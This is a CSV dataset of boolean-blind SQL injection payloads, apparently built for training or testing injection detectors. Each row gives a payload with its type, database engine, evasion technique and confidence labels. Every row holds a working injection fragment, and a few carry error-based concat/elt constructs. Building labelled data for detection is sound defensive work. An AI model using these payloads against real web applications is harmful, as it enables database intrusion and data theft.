payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
-4248 where 3288 = 3288 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select ijck where 9961 = 9961,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-8745\' ) as xpwv where 8855 = 8855,boolean_blind,unknown,,0.8,rule,bccc,unknown
-9770\' ) ) as ovhh where 7903 = 7903,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) as ulbr where 7233 = 7233 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-1344 ) as gqgi where 2545 = 2545,boolean_blind,unknown,,0.8,rule,bccc,unknown
-6190\' ) where 2621 = 2621,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) ) as dgso where 4654 = 4654,boolean_blind,unknown,,0.8,rule,bccc,unknown
-7962\' ) ) as pgqz where 6058 = 6058 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) as zmxb where 8424 = 8424 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) ) as bswc where 1635 = 1635,boolean_blind,unknown,,0.8,rule,bccc,unknown
-2495 ) ) as hudw where 4197 = 4197,boolean_blind,unknown,,0.8,rule,bccc,unknown
-9263\' ) as qodg where 6798 = 6798,boolean_blind,unknown,,0.8,rule,bccc,unknown
-4582 ) ) as gvfo where 8885 = 8885,boolean_blind,unknown,,0.8,rule,bccc,unknown
-4322\' ) ) as magw where 1627 = 1627 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-9840 ) ) as thod where 4790 = 4790,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select \'kicv\' where 1976 = 1976,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-9668\' ) ) as orfu where 5822 = 5822,boolean_blind,unknown,,0.8,rule,bccc,unknown
-4248 where 3288 = 3288,boolean_blind,unknown,,0.8,rule,bccc,unknown
-7659\' ) as bowy where 4835 = 4835 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select onzd where 8452 = 8452,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-8007\' ) ) as bgpp where 9555 = 9555,boolean_blind,unknown,,0.8,rule,bccc,unknown
"1\'|| ( select \'jpso\' from dual where 9357 = 9357 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||\",boolean_blind,oracle,case_variation|hex_string,0.46,rule,bccc,unknown
1\'|| ( select \'rjis\' from dual where 7696 = 7696,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
-7184 ) as fshx where 3408 = 3408,boolean_blind,unknown,,0.8,rule,bccc,unknown
-8828 ) ) as ospo where 2141 = 2141,boolean_blind,unknown,,0.8,rule,bccc,unknown
-6519\' ) ) as tdlt where 5040 = 5040 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-3458\' ) where 2053 = 2053,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select twyt where 3376 = 3376,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\' ) as wpmv where 1479 = 1479 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'ftey\' where 1363 = 1363,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-7659\' ) as bowy where 4835 = 4835,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) as zmxb where 8424 = 8424,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'yucg\' where 2576 = 2576,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
"1\'|| ( select \'ftey\' where 1363 = 1363 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||\",boolean_blind,unknown,case_variation|hex_string,0.8,rule,bccc,unknown
1\' ) as pogx where 4105 = 4105 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) where 1502 = 1502,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) as hlbq where 2347 = 2347,boolean_blind,unknown,,0.8,rule,bccc,unknown
-4215 ) where 5782 = 5782 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) where 4277 = 4277,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 where 5161 = 5161 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select \'iqxn\' where 1146 = 1146 and username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'|| ( select \'brde\' where 7390 = 7390,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-1021 ) as erjh where 7845 = 7845,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) ) as eltx where 9955 = 9955,boolean_blind,unknown,,0.8,rule,bccc,unknown
-2348 ) as sige where 1639 = 1639,boolean_blind,unknown,,0.8,rule,bccc,unknown
-9742 ) where 8409 = 8409,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'adiv\' from dual where 9842 = 9842 or username =,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
-5751 ) as jybu where 4739 = 4739,boolean_blind,unknown,,0.8,rule,bccc,unknown
-7770\' where 6503 = 6503,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'brde\' where 7390 = 7390 and username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'+ ( select \'iqxn\' where 1146 = 1146,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'+ ( select vohg where 6383 = 6383,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
"1\'+ ( select sshu where 3442 = 3442 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) +\",boolean_blind,unknown,case_variation|hex_string,0.8,rule,bccc,unknown
-6519\' ) ) as tdlt where 5040 = 5040,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) ) as plbt where 4368 = 4368,boolean_blind,unknown,,0.8,rule,bccc,unknown
-7430\' ) as xfah where 1596 = 1596,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 where 5161 = 5161,boolean_blind,unknown,,0.8,rule,bccc,unknown
-6244\' ) as szpd where 8445 = 8445,boolean_blind,unknown,,0.8,rule,bccc,unknown
-9668\' ) ) as orfu where 5822 = 5822 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) ) as iihk where 5414 = 5414,boolean_blind,unknown,,0.8,rule,bccc,unknown
